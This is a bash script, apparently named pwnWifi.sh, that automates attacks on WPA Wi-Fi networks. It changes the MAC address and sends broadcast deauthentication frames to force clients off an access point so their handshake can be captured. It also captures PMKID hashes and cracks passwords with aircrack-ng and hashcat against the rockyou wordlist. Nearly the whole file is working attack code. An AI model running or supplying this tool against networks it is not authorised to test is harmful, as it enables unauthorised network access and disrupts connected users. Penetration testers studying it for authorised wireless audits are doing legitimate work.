#!/bin/bash

# Author: Osman Tunahan ARIKAN 
# Github: https://github.com/OsmanTunahan

GREEN="\033[1;32m"
RESET="\033[0m"
RED="\033[1;31m"
BLUE="\033[1;34m"
YELLOW="\033[1;33m"
PURPLE="\033[1;35m"
TURQUOISE="\033[1;36m"
GRAY="\033[1;37m"

export DEBIAN_FRONTEND=noninteractive

trap exit_script INT

function exit_script() {
    echo -e "\n${YELLOW}[*]${END_COLOR}${GRAY} Exiting${END_COLOR}"
    tput cnorm
    airmon-ng stop "${network_interface}mon" > /dev/null 2>&1
    rm Capture* 2>/dev/null
    exit 0
}

function display_help() {
    echo -e "\n${YELLOW}[*]${END_COLOR}${GRAY} Usage: ./pwnWifi.sh${END_COLOR}"
    echo -e "\n\t${PURPLE}a)${END_COLOR}${YELLOW} Attack Mode${END_COLOR}"
    echo -e "\t\t${RED}Handshake${END_COLOR}"
    echo -e "\t\t${RED}PKMID${END_COLOR}"
    echo -e "\t${PURPLE}n)${END_COLOR}${YELLOW} Network Interface Name${END_COLOR}"
    echo -e "\t${PURPLE}h)${END_COLOR}${YELLOW} Show this help panel${END_COLOR}\n"
    exit 0
}

function check_dependencies() {
    tput civis
    clear
    dependencies=(aircrack-ng macchanger)

    echo -e "${YELLOW}[*]${END_COLOR}${GRAY} Checking for necessary programs...${END_COLOR}"
    sleep 2

    for program in "${dependencies[@]}"; do
        echo -ne "\n${YELLOW}[*]${END_COLOR}${BLUE} Tool${END_COLOR}${PURPLE} $program${END_COLOR}${BLUE}...${END_COLOR}"

        if command -v "$program" &> /dev/null; then
            echo -e " ${GREEN}(V)${END_COLOR}"
        else
            echo -e " ${RED}(X)${END_COLOR}\n"
            echo -e "${YELLOW}[*]${END_COLOR}${GRAY} Installing tool ${END_COLOR}${BLUE}$program${END_COLOR}${YELLOW}...${END_COLOR}"
            apt-get install "$program" -y > /dev/null 2>&1
        fi
        sleep 1
    done
}

function configure_network() {
    clear
    echo -e "${YELLOW}[*]${END_COLOR}${GRAY} Configuring network interface...${END_COLOR}\n"
    airmon-ng start "$network_interface" > /dev/null 2>&1
    ifconfig "${network_interface}mon" down && macchanger -a "${network_interface}mon" > /dev/null 2>&1
    ifconfig "${network_interface}mon" up
    killall dhclient wpa_supplicant 2>/dev/null

    echo -e "${YELLOW}[*]${END_COLOR}${GRAY} New MAC address assigned ${END_COLOR}${PURPLE}[${END_COLOR}${BLUE}$(macchanger -s "${network_interface}mon" | grep -i current | xargs | cut -d ' ' -f '3-100')${END_COLOR}${PURPLE}]${END_COLOR}"
}

function start_handshake_attack() {
    xterm -hold -e "airodump-ng ${network_interface}mon" &
    local airodump_xterm_PID=$!
    
    echo -ne "\n${YELLOW}[*]${END_COLOR}${GRAY} Access Point Name: ${END_COLOR}" 
    read -r ap_name
    echo -ne "\n${YELLOW}[*]${END_COLOR}${GRAY} Access Point Channel: ${END_COLOR}" 
    read -r ap_channel

    kill -9 "$airodump_xterm_PID"
    wait "$airodump_xterm_PID" 2>/dev/null

    xterm -hold -e "airodump-ng -c $ap_channel -w Capture --essid $ap_name ${network_interface}mon" &
    local airodump_filter_xterm_PID=$!

    sleep 5
    xterm -hold -e "aireplay-ng -0 10 -e $ap_name -c FF:FF:FF:FF:FF:FF ${network_interface}mon" &
    local aireplay_xterm_PID=$!
    sleep 10
    kill -9 "$aireplay_xterm_PID"
    wait "$aireplay_xterm_PID" 2>/dev/null

    sleep 10
    kill -9 "$airodump_filter_xterm_PID"
    wait "$airodump_filter_xterm_PID" 2>/dev/null

    xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Capture-01.cap"
}

function start_pkmid_attack() {
    clear
    echo -e "${YELLOW}[*]${END_COLOR}${GRAY} Starting ClientLess PKMID Attack...${END_COLOR}\n"
    sleep 2
    timeout 60 bash -c "hcxdumptool -i ${network_interface}mon --enable_status=1 -o Capture"
    echo -e "\n\n${YELLOW}[*]${END_COLOR}${GRAY} Obtaining hashes...${END_COLOR}\n"
    sleep 2
    hcxpcaptool -z myHashes Capture
    rm Capture 2>/dev/null

    if [[ -f myHashes ]]; then
        echo -e "\n${YELLOW}[*]${END_COLOR}${GRAY} Starting brute-force process...${END_COLOR}\n"
        sleep 2
        hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
    else
        echo -e "\n${RED}[!]${END_COLOR}${GRAY} Failed to capture the necessary packet...${END_COLOR}\n"
        rm Capture* 2>/dev/null
        sleep 2
    fi
}

function start_attack() {
    configure_network

    case "$attack_mode" in
        Handshake)
            start_handshake_attack
            ;;
        PKMID)
            start_pkmid_attack
            ;;
        *)
            echo -e "\n${RED}[*] Invalid attack mode${END_COLOR}\n"
            ;;
    esac
}

# Main Function
if [[ "$(id -u)" == "0" ]]; then
    parameter_counter=0
    while getopts ":a:n:h:" arg; do
        case $arg in
            a) attack_mode=$OPTARG; ((parameter_counter++)) ;;
            n) network_interface=$OPTARG; ((parameter_counter++)) ;;
            h) display_help ;;
        esac
    done

    if [[ $parameter_counter -ne 2 ]]; then
        display_help
    else
        check_dependencies
        start_attack
        tput cnorm
        airmon-ng stop "${network_interface}mon" > /dev/null 2>&1
    fi
else
    echo -e "\n${RED}[*] You are not root${END_COLOR}\n"
fi